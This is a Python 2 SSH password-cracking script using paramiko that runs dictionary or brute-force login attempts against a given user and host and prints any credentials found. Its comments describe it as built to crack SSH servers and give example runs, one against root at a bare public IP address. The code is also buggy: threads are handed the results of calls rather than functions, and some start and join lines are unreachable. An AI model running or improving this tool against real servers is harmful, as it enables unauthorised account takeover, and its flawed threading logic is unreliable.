#!/usr/bin/env python

import sys, time, threading
import paramiko
import itertools
import socket

############################################
# This script is meant to explicitly crack an SSH server.
# It will run either a dictionary attack or a brute-force attack depending on whether a dictionary file is given.
# To issue a test run, you may attempt to pentest one of the wargames servers over at overthewire.org
# So long as ssh.py has correct permissions to run, simply type:
# ./ssh.py manpage0 manpage0.labs.overthewire.org dictionary
# Or for a brute-force attack, try:
# ./ssh.py root 104.236.126.87
############################################
# To fix: Add MOAR THREADING.  Fix the weird error that pops up at the beginning of a brute-force attack.

passed_list = []

def brute_gen():

        list = 'abcdefghijklmnopqrstuvwxyz'
        list1 = 'abcdefghijklmnopqrstuvwxyz1234567890'
        LIST = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
        result = []
        number = 8     #input("What is the maximum passwords length? ")
        if type(number) != int:
                print "Please enter a number."
                main()
        else:
                for zz in range(5,9):
                        for zzz in itertools.product(list1,repeat=zz):
                                passed_list.append((''.join(zzz)))
				if len(passed_list)%100 == 0:
					return passed_list
					time.sleep(20)
					continue
	

def attempt(IP,UserName,Password):

	ssh = paramiko.SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())

	try:
		ssh.connect(IP, 22, UserName, Password)

	except paramiko.AuthenticationException, error:
		print '[-] Password failed: %s' % (Password)
	
	except paramiko.SSHException, error:
		print '[-] Attempt failed, probably a missing host key.'

	except socket.error, error:
		print '[-] Socket error!'

	except Exception, error:
		print '[-] Unknown error!'

	else:
 		print '\n[!] Found the correct credentials!\nUsername: %s\nPassword: %s\n' % (UserName, Password)
		ssh.close()
		sys.exit(1)

	ssh.close()
	return

def main():
	if len(sys.argv) >= 3:
		user = sys.argv[1]
		ip = sys.argv[2]

	if len(sys.argv) == 3:
		t1 = threading.Thread(target = brute_gen())
		t1.start()
		time.sleep(1)
		print '[+] Running brute-force attack against %s@%s' % (user, ip)
		for i in passed_list:
			t2 = threading.Thread(target=attempt(ip, user, i))

	elif len(sys.argv) == 4:
		filename = sys.argv[3]
		dictionary = open(filename, 'r')
		print '[+] Running attack against %s@%s with dictionary: %s' % (user, ip, filename)
		for i in dictionary.readlines():
			t2 = threading.Thread(target=attempt(ip, user, i.strip()))

	elif len(sys.argv) < 3:
		print "\nUsage: %s Username Hostname /path/to/dictionary" % (str(sys.argv[0]))
                print "\nIf no dictionary file is given, a brute-force attack will be run."
                print "\nExample: %s root 10.0.0.1 ~/dict.txt\n" % (str(sys.argv[0]))
                sys.exit(1)

		t2.start()
		t1.join()
		t2.join()
		time.sleep(0.5) # started with 0.3, but most servers couldn't handle that speed
    
	dictionary.close()
	sys.exit(0)

#############################################

if __name__ == '__main__':
	main()
